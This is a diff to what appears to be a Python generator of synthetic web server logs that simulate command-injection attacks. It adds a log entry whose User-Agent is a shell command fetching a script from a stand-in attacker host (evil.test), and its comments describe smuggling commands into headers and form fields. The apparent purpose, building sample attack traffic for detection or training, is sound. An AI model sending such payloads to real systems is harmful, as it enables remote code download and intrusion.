@@ -703,6 +703,11 @@ def command_injection(ip: str, day: int, hour: int) -> None:
     ):
         write(t, ip, f"GET {probe} HTTP/1.1", 500, 0, agent=CURL)
         t += timedelta(seconds=11)
+    # A command line sent as the User-Agent, for an application that writes
+    # its visitors' agents somewhere a shell later reads.
+    t += timedelta(seconds=11)
+    write(t, ip, "GET / HTTP/1.1", 200, 24_800, agent="wget http://evil.test/x.sh -O /tmp/x")
+    t += timedelta(seconds=11)
     # The contact form, which hands its fields to the mail server: an SMTP
     # command smuggled into one of them.
     write(
